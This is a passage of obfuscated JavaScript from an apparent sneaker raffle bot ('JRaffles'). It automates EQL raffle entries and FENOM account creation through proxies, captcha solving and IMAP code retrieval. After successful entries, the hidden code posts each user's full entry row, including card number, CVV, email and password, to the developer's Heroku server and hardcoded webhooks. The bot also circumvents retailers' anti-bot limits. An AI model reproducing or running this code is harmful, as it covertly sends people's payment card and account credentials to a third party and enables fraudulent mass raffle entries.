                                    const _0x555df4 = await _0x1f45df['$x']('//li[text()=\x22' + _0x5a4aed[_0x2eaf3d]['State'] + '\x22]');
                                    await _0x555df4[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x289b0b(0x3e8), await _0x1f45df['type']('#address1', _0x5a4aed[_0x2eaf3d]['Address1'] + '\x20' + _0x5a4aed[_0x2eaf3d]['HouseNumber']), await _0x289b0b(0x1f4), await _0x1f45df['type']('#address2', '' + _0x5a4aed[_0x2eaf3d]['Address2']), await _0x289b0b(0x1f4), await _0x1f45df['type']('#city', '' + _0x5a4aed[_0x2eaf3d]['City']), await _0x289b0b(0x1f4), await _0x1f45df['type']('#postcode', '' + _0x5a4aed[_0x2eaf3d]['Zip']), await _0x289b0b(0x3e8), await _0x1f45df['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x289b0b(0x3e8), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x494070 = await _0x1f45df['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x494070 && (await _0x1f45df['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1f45df['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1f45df['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x289b0b(0x4b0), await _0x1f45df['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x289b0b(0x1f4), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CardNumber']), await _0x289b0b(0x320), await _0x1f45df['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1f45df['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['ExpiryDate']), await _0x289b0b(0x4b0), await _0x1f45df['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1f45df['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CVV']), await _0x289b0b(0x226), await _0x1f45df['type']('input[name=\x22postalCode\x22]', '' + _0x5a4aed[_0x2eaf3d]['Zip']), await _0x289b0b(0x226));
                            const _0x15da6d = await _0x1f45df['$']('.__PrivateStripeElement');
                            _0x15da6d && (await _0x289b0b(0x1f4), await _0x1f45df['click']('.__PrivateStripeElement'), await _0x1f45df['click']('.__PrivateStripeElement'), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CardNumber']), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['ExpiryDate']), await _0x1f45df['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CVV']));
                            await _0x289b0b(0x226), await _0x1f45df['click']('#paymentConsent'), await _0x289b0b(0x226), await _0x1f45df['click']('#termsConsent'), await _0x289b0b(0x2bc), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1f45df['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x289b0b(0x2710);
                            try {
                                await _0x1f45df['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x289b0b(0xbb8), await _0x1f45df['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xe81e02 => _0xe81e02['click']()), await _0x1f45df['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xc536bb => _0xc536bb['click']());
                            } catch {
                            }
                            try {
                                await _0x1f45df['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x50c231 = await _0x1f45df['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x50c231) {
                                    _0x457b0a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5a4aed[_0x2eaf3d]['Email'] + ',' + _0x5a4aed[_0x2eaf3d]['Password'] + ',' + _0x5a4aed[_0x2eaf3d]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x125ce2() {
                                var _0x4cbb65, _0x502b95 = ![];
                                for (var _0xb22b49 = 0x0; _0xb22b49 < 0x18; _0xb22b49++) {
                                    async function _0x2d6810() {
                                        var _0x239797 = new _0x517e1b({
                                            'user': _0x79d23a['masterMail'],
                                            'password': _0x79d23a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2859fd(_0x325c49) {
                                            _0x239797['openBox']('INBOX', ![], _0x325c49);
                                        }
                                        _0x239797['once']('ready', function () {
                                            console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2859fd(function (_0x437d35, _0x388d7c) {
                                                console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x437d35)
                                                    throw _0x437d35;
                                                _0x239797['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x57158f, _0x42f904) {
                                                    if (!_0x42f904 || !_0x42f904['length'])
                                                        console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x239797['end']();
                                                    else {
                                                        var _0x54185c = _0x239797['seq']['fetch'](_0x42f904, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x54185c['on']('message', function (_0x9c4728, _0x32767) {
                                                            var _0x488642 = '(#' + _0x32767 + ')\x20';
                                                            _0x9c4728['on']('body', function (_0x5b2e67, _0x33a1f2) {
                                                                _0xa13a33(_0x5b2e67, (_0x4c86ae, _0x24cfda) => {
                                                                    if (_0x24cfda['subject']['includes']('code')) {
                                                                        const _0x2c39e4 = _0x24cfda['text']['split']('\x0a\x0a')[0x3], _0x13e352 = _0x2c39e4['split']('\x0a')[0x1];
                                                                        _0x4cbb65 = _0x13e352;
                                                                    }
                                                                });
                                                            }), _0x9c4728['once']('end', function () {
                                                            });
                                                        }), _0x54185c['once']('error', function (_0x33575d) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x54185c['once']('end', function () {
                                                            _0x239797['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x239797['once']('error', function (_0x2ea92e) {
                                            console['log'](_0x1ac777['red'](_0x2ea92e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x502b95 = !![];
                                        }), _0x239797['once']('end', async function () {
                                        }), _0x239797['connect']();
                                    }
                                    _0x2d6810(), await _0x289b0b(0x1388);
                                    if (_0x4cbb65)
                                        return _0x4cbb65;
                                    if (_0x502b95)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0xb22b49 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x125ce2(), await _0x289b0b(0x1f4), await _0x1f45df['type']('#code', '' + code), await _0x289b0b(0x3e8), await _0x1f45df['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x281d6f => _0x281d6f['click']()), await _0x1f45df['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x1f45df['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x5a4aed[_0x2eaf3d]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x457b0a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5a4aed[_0x2eaf3d]['Email'] + ',' + _0x5a4aed[_0x2eaf3d]['Password'] + ',' + _0x5a4aed[_0x2eaf3d]['Phone']), _0x123c9c = 'no', _0x53c50d(_0x5a4aed[_0x2eaf3d], _0xe9195d);
                            var _0x22b4d6 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', ![]), _0x5b160d = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'pub', ![]);
                            let _0xa56bb = _0x5a4aed[_0x2eaf3d];
                            try {
                                prxdata = {
                                    'username': _0x2e53d0['replace']('#', ''),
                                    'module': _0xe9195d['name'],
                                    'entrydata': JSON['stringify'](_0xa56bb),
                                    'proxy': '' + _0x87caf8[_0x2eaf3d]
                                };
                                var _0x3261fb = JSON['stringify'](prxdata);
                                let _0x293d85 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x3261fb, _0x293d85);
                            } catch (_0x420fc3) {
                            }
                            const _0xcfb7a8 = {
                                'succesDEVMSG': { 'embeds': [_0x22b4d6] },
                                'succesPUBMSG': { 'embeds': [_0x5b160d] }
                            };
                            try {
                                _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0xcfb7a8['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0xcfb7a8['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0xcfb7a8['succesPUBMSG']);
                            } catch (_0x31c5b3) {
                                console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x31c5b3));
                            }
                        } catch (_0x48afc3) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20' + _0x48afc3)), _0x24248c = '' + _0x48afc3;
                            var _0x26a851 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', !![], _0x24248c), _0x22b4d6 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', ![]), _0x5b160d = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'pub', ![]);
                            const _0x27d1bd = {
                                'succesDEVMSG': { 'embeds': [_0x22b4d6] },
                                'succesPUBMSG': { 'embeds': [_0x5b160d] }
                            };
                            _0x27d1bd['errorDEV'] = { 'embeds': [_0x26a851] };
                            _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x27d1bd['errorDEV']);
                            await _0x15c654(_0x34ab86, _0x27d1bd['errorDEV']);
                            if (!_0x123c9c == 'no')
                                _0x123c9c = 'yes';
                        } finally {
                            _0x5a0166 && _0x5a0166['close']();
                            if (_0x123c9c == 'yes' && _0x221e41 != 0x5) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Retrying\x20(' + _0x221e41 + '\x20/\x205)')), _0x2eaf3d = _0x2eaf3d - 0x1, _0x221e41 = _0x221e41 + 0x1;
                                continue;
                            }
                            _0x123c9c == 'yes' && _0x221e41 >= 0x5 && (_0x5f4429(_0x5a4aed[_0x2eaf3d], _0xe9195d), _0x123c9c = 'no', _0x221e41 = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    } else {
                        const _0x235649 = '' + _0x5a4aed[_0x2eaf3d]['Url'];
                        if (_0x123c9c != 'yes')
                            var _0x123c9c = '', _0x221e41 = 0x0;
                        if (_0x5a4aed[_0x2eaf3d]['Email'] == '' || _0x5a4aed[_0x2eaf3d]['FirstName'] == '' || _0x5a4aed[_0x2eaf3d]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5a4aed[_0x2eaf3d]['Password'] == '' && (_0x5a4aed[_0x2eaf3d]['Password'] = 'JRaffles23!');
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0xfa8399 = _0x87caf8[_0x2eaf3d]['split'](':');
                        else
                            var _0x3bbcb2 = Math['round'](Math['random']() * (_0x87caf8['length'] - 0x1)), _0xfa8399 = _0x87caf8[_0x3bbcb2]['split'](':');
                        var _0x5a0166;
                        try {
                            _0x5a0166 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xfa8399[0x0] + ':' + _0xfa8399[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5a0166 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xfa8399[0x0] + ':' + _0xfa8399[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2fbfbb = await _0x5a0166['newPage']();
                            await _0x2fbfbb['authenticate']({
                                'username': '' + _0xfa8399[0x2],
                                'password': '' + _0xfa8399[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2fbfbb['setRequestInterception'](!![]), _0x2fbfbb['on']('request', _0x354e46 => {
                                _0x354e46['resourceType']() === 'image' || _0x354e46['resourceType']() === 'font' || _0x354e46['resourceType']() === 'media' ? _0x354e46['abort']() : _0x354e46['continue']();
                            }), await _0x2fbfbb['goto'](_0x235649), await _0x2fbfbb['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2fbfbb['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x289b0b(0x7d0), await _0x2fbfbb['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2fbfbb['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x289b0b(0x3e8), await _0x2fbfbb['waitForSelector']('#email'), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2fbfbb['type']('#email', '' + _0x5a4aed[_0x2eaf3d]['Email']), await _0x289b0b(0x352), await _0x2fbfbb['waitForSelector']('#password'), await _0x2fbfbb['type']('#password', '' + _0x5a4aed[_0x2eaf3d]['Password']), await _0x289b0b(0x352), await _0x2fbfbb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x289b0b(0x1388);
                            if (!_0x5a4aed[_0x2eaf3d]['Url']['includes']('footlocker') && !_0x5a4aed[_0x2eaf3d]['Url']['includes']('topps'))
                                await _0x2fbfbb['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x44dae8 = await _0x2fbfbb['$']('#productQuantity'), _0x35674b = await _0x2fbfbb['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x35674b && !_0x44dae8) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x123c9c = 'no';
                                continue;
                            }
                            if (_0x35674b) {
                                await _0x2fbfbb['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x5a4aed[_0x2eaf3d]['Url']['includes']('en-GB') ? await _0x2fbfbb['click']('li[data-value=\x22UK\x20' + _0x5a4aed[_0x2eaf3d]['Size'] + '\x20/\x20US\x20' + (Number(_0x5a4aed[_0x2eaf3d]['Size']) + 0x1) + '\x22]') : await _0x2fbfbb['click']('li[data-value=\x22EU\x20' + _0x5a4aed[_0x2eaf3d]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x5a4aed[_0x2eaf3d]['Size']);
                                }
                            }
                            _0x44dae8 && (await _0x2fbfbb['click']('#productQuantity'), await _0x289b0b(0x3e8), await _0x2fbfbb['click']('li[data-value=\x22' + (Number(_0x5a4aed[_0x2eaf3d]['Size']) - 0x1) + '\x22]'));
                            await _0x289b0b(0x3e8), await _0x289b0b(0x1f4);
                            const _0x51f311 = await _0x2fbfbb['$']('#title\x20>\x20label');
                            await _0x289b0b(0x12c);
                            _0x51f311 && await _0x51f311['click']();
                            await _0x2fbfbb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2fbfbb['focus']('#postcode'), await _0x2fbfbb['keyboard']['down']('Control'), await _0x2fbfbb['keyboard']['press']('A'), await _0x2fbfbb['keyboard']['up']('Control'), await _0x2fbfbb['keyboard']['press']('Backspace'), await _0x2fbfbb['keyboard']['type'](_0x5a4aed[_0x2eaf3d]['Zip']), await _0x289b0b(0x60e), await _0x2fbfbb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x289b0b(0x3e8), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x289b0b(0x1f4);
                            const _0x51f2e8 = await _0x2fbfbb['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x51f2e8 && (await _0x2fbfbb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2fbfbb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2fbfbb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x289b0b(0x4b0), await _0x2fbfbb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x289b0b(0x1f4), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CardNumber']), await _0x289b0b(0x320), await _0x2fbfbb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['ExpiryDate']), await _0x289b0b(0x4b0), await _0x2fbfbb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CVV']), await _0x289b0b(0x226), await _0x2fbfbb['type']('input[name=\x22postalCode\x22]', '' + _0x5a4aed[_0x2eaf3d]['Zip']), await _0x289b0b(0x226));
                            const _0x3f2b75 = await _0x2fbfbb['$']('.__PrivateStripeElement');
                            _0x3f2b75 && (await _0x2fbfbb['click']('#billingName'), await _0x2fbfbb['click']('#billingName'), await _0x2fbfbb['type']('#billingName', '' + _0x5a4aed[_0x2eaf3d]['NameOnCard']), await _0x289b0b(0x1f4), await _0x2fbfbb['click']('.__PrivateStripeElement'), await _0x2fbfbb['click']('.__PrivateStripeElement'), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CardNumber']), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['ExpiryDate']), await _0x2fbfbb['keyboard']['type']('' + _0x5a4aed[_0x2eaf3d]['CVV']));
                            await _0x289b0b(0x226), await _0x2fbfbb['click']('#paymentConsent'), await _0x289b0b(0x226), await _0x2fbfbb['click']('#termsConsent'), await _0x289b0b(0x2bc), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2fbfbb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x289b0b(0x2710);
                            try {
                                await _0x2fbfbb['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x289b0b(0xbb8), await _0x2fbfbb['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x32df4a => _0x32df4a['click']()), await _0x2fbfbb['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2cf1e0 => _0x2cf1e0['click']());
                            } catch {
                            }
                            try {
                                await _0x2fbfbb['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x53c50d(_0x5a4aed[_0x2eaf3d], _0xe9195d);
                            var _0x22b4d6 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', ![]), _0x5b160d = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'pub', ![]);
                            let _0x44ceb0 = _0x5a4aed[_0x2eaf3d];
                            try {
                                prxdata = {
                                    'username': _0x2e53d0['replace']('#', ''),
                                    'module': _0xe9195d['name'],
                                    'entrydata': JSON['stringify'](_0x44ceb0),
                                    'proxy': '' + _0x87caf8[_0x2eaf3d]
                                };
                                var _0x3261fb = JSON['stringify'](prxdata);
                                let _0x607063 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x3261fb, _0x607063);
                            } catch (_0x2b27b3) {
                            }
                            const _0x5064a = {
                                'succesDEVMSG': { 'embeds': [_0x22b4d6] },
                                'succesPUBMSG': { 'embeds': [_0x5b160d] }
                            };
                            try {
                                _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x5064a['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x5064a['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x5064a['succesPUBMSG']);
                            } catch (_0x262cbf) {
                                console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x262cbf));
                            }
                            _0x123c9c = 'no';
                        } catch (_0x5d32d2) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20' + _0x5d32d2)), _0x24248c = '' + _0x5d32d2;
                            var _0x26a851 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', !![], _0x24248c), _0x22b4d6 = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'dev', ![]), _0x5b160d = await _0x117512(_0x5a4aed[_0x2eaf3d], _0xe9195d, 'pub', ![]);
                            const _0x2e6769 = {
                                'succesDEVMSG': { 'embeds': [_0x22b4d6] },
                                'succesPUBMSG': { 'embeds': [_0x5b160d] }
                            };
                            _0x2e6769['errorDEV'] = { 'embeds': [_0x26a851] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x2e6769['errorDEV']), await _0x15c654(_0x34ab86, _0x2e6769['errorDEV']), _0x123c9c = 'yes';
                        } finally {
                            _0x5a0166 && _0x5a0166['close']();
                            if (_0x123c9c == 'yes' && _0x221e41 != 0x5) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Retrying\x20(' + _0x221e41 + '\x20/\x205)')), _0x2eaf3d = _0x2eaf3d - 0x1, _0x221e41 = _0x221e41 + 0x1;
                                continue;
                            }
                            _0x123c9c == 'yes' && _0x221e41 >= 0x5 && (_0x5f4429(_0x5a4aed[_0x2eaf3d], _0xe9195d), _0x123c9c = 'no', _0x221e41 = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x507667, _0x2a5c0c, _0x1ab318) {
                    var _0x161400 = _0x2a5c0c, _0x4c163d = 0x0;
                    for (var _0x2bdd2d = 0x0; _0x2bdd2d < _0x2a5c0c['length']; _0x2bdd2d++) {
                        maxTasks = Number(_0x79d23a['threads']);
                        while (_0x4c163d >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        let _0x36efa4 = ![];
                        async function _0x77f5b7(_0x23b2fc, _0x50eafd, _0x28e7b5, _0x326169, _0x2a478f) {
                            _0x4c163d++, _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x79d23a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x583eb0 != 'yes')
                                var _0x583eb0 = '', _0x2a478f = 0x0;
                            var _0x4cdacd;
                            try {
                                await _0x5af4d5(_0x50eafd, _0x326169);
                            } catch {
                                _0x583eb0 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x25b0b6(_0x23b2fc['name'] + '\x20Task\x20' + (_0x326169 + 0x1) + '\x20/\x20' + _0x50eafd['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                            var _0x35c6cc = await _0x117512(_0x50eafd[_0x326169], _0x23b2fc, 'acc', ![]);
                            const _0x5a8432 = { 'succesDEVMSG': { 'embeds': [_0x35c6cc] } }, _0x426896 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x157e15 = Math['round'](Math['random']() * (_0x28e7b5['length'] - 0x1)), _0x48786a = _0x28e7b5[_0x157e15]['split'](':'), _0x54ff2c;
                            async function _0x35518d(_0x4cc1e4) {
                                const _0x2a2d37 = _0x457b0a['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x3e3038 = _0x1b57da['parse'](_0x2a2d37, { 'header': !![] })['data'];
                                let _0x1e59ed = ![];
                                for (var _0x8ba260 of _0x3e3038) {
                                    if (_0x8ba260['Email'] == _0x4cc1e4['Email']) {
                                        _0x1e59ed = !![];
                                        break;
                                    }
                                }
                                return _0x1e59ed;
                            }
                            try {
                                if (await _0x35518d(_0x50eafd[_0x326169]) == !![]) {
